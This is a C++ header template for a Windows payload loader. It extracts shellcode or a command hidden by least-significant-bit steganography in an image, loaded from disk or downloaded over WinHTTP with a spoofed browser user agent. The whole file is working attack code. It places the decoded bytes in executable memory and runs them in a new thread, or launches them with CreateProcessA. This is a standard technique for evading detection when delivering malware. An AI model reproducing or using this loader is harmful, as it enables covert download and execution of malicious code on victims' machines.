#pragma once
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <gdiplus.h>

#pragma comment(lib,"gdiplus.lib")

using namespace Gdiplus;

#define payload_type_shellcode 1
#define payload_type_cmd 2
#define PAYLOAD_TYPE payload_type_{{ payload_type }}


#define PAYLOAD_BITS  {{ PAYLOAD_BITS }};

#define delivery_method_remote 1
#define delivery_method_local 2

#define DELIVERY_METHOD delivery_method_{{ delivery_method }}


#define payload_algorithm_lsb 1
#define payload_algorithm_lsb_x 2

#define PAYLOAD_ALGORITHM payload_algorithm_{{ payload_algorithm }}

// For testing
//#define PAYLOAD_TYPE 1
//#define PAYLOAD_BITS 46064
//#define DELIVERY_METHOD 2
//#define PAYLOAD_ALGORITHM 1




const int shellcode_len = PAYLOAD_BITS;
char* payload_data = new char[shellcode_len / 8];





#if PAYLOAD_TYPE == payload_type_shellcode
void run() {
    //LPVOID heap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
    //LPVOID ptr = HeapAlloc(heap, 0, shellcode_len / 8);

    LPVOID ptr = VirtualAlloc(0, (shellcode_len / 8), 0x3000, 0x40);
    RtlMoveMemory(ptr, payload_data, shellcode_len / 8);


    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ptr, NULL, 0, 0);
    Sleep(2000);
}
#endif


#if PAYLOAD_TYPE == payload_type_cmd
void run() {
    STARTUPINFOA si;
    ZeroMemory(&si, sizeof(STARTUPINFOA));
    PROCESS_INFORMATION pi;

    CreateProcessA(
        NULL,
        payload_data,
        NULL,
        NULL,
        FALSE,
        NULL,
        NULL,
        NULL,
        &si,
        &pi
    );
    Sleep(3000);
    }
#endif







#if DELIVERY_METHOD == delivery_method_remote 

#pragma comment(lib, "winhttp.lib")

#include <winhttp.h>
#include <string>


std::wstring parse_url(std::wstring* url, wchar_t delim) {
    int pos = url->find_last_of(delim);
    std::wstring res = url->substr(pos + 1, std::wstring::npos);

    *url = url->substr(0, pos);

    return res;
}

Gdiplus::Bitmap* load_image(std::wstring url) {
    // get image from http server 
    HINTERNET hSession, hConnect, hRequest;


    std::wstring file_path = L'/' + parse_url(&url, L'/');

    int port = std::stoi(parse_url(&url, L':'));

    std::wstring host = parse_url(&url, L'/');

    int flag = (url == L"https:/") ? WINHTTP_FLAG_SECURE : 0;


    hSession = WinHttpOpen(
        L"Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0
    );

    hConnect = WinHttpConnect(
        hSession,
        host.c_str(),
        port,
        0
    );

    hRequest = WinHttpOpenRequest(
        hConnect,
        L"GET",
        file_path.c_str(),
        NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        flag
    );

    WinHttpSendRequest(
        hRequest,
        WINHTTP_NO_ADDITIONAL_HEADERS,
        0,
        WINHTTP_NO_REQUEST_DATA,
        0,
        0,
        0
    );

    WinHttpReceiveResponse(hRequest, NULL);

    DWORD dwSize;
    DWORD dwBytesRead;
    DWORD dwOffset = 0;

    WinHttpQueryDataAvailable(hRequest, &dwSize);

    std::string data;


    do
    {
        dwOffset = data.size();
        data.resize(dwSize + dwOffset);

        WinHttpQueryDataAvailable(hRequest, &dwSize);
        WinHttpReadData(hRequest, &data[dwOffset], dwSize, &dwBytesRead);

        data.resize(dwBytesRead + dwOffset);

    } while (dwSize > 0);


    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);


    // init an IStream in memory to create a bitmap later
    HGLOBAL img_gl_buffer = GlobalAlloc(GMEM_MOVEABLE, data.size() + 1);
    LPVOID img_buffer = GlobalLock(img_gl_buffer);

    CopyMemory(img_buffer, data.c_str(), data.size() + 1);

    IStream* img_stream = NULL;
    CreateStreamOnHGlobal(img_buffer, FALSE, &img_stream);


    // load image
    Gdiplus::Bitmap* bmp = Gdiplus::Bitmap::FromStream(img_stream);

    return bmp;
}

#endif 



#if DELIVERY_METHOD == delivery_method_local 

Gdiplus::Bitmap* load_image(LPCWSTR filename) {
    // load image
    Gdiplus::Bitmap* bmp = Gdiplus::Bitmap::FromFile(filename);
    return bmp;
}
#endif 



#if PAYLOAD_ALGORITHM == payload_algorithm_lsb
char get_lsb(char target, char source) {
    return (target << 1) | (source & 1);
}

void read_image(Gdiplus::Bitmap* bmp) {
    Color c;
    char channels[3];

    int length = shellcode_len;
    int pos = 0;

    for (int i = 0; i < bmp->GetHeight(); i++) {
        for (int j = 0; j < bmp->GetWidth(); j++) {

            bmp->GetPixel(j, i, &c);

            channels[0] = c.GetR();
            channels[1] = c.GetG();
            channels[2] = c.GetB();

            for (int k = 0; k < 3; k++) {
                if (length <= 0) {
                    payload_data[pos / 8] = 0;
                    return;
                }

                payload_data[pos / 8] = get_lsb(payload_data[pos / 8], channels[k]);
                pos++;
                length--;
            }
        }
    }
}
#endif



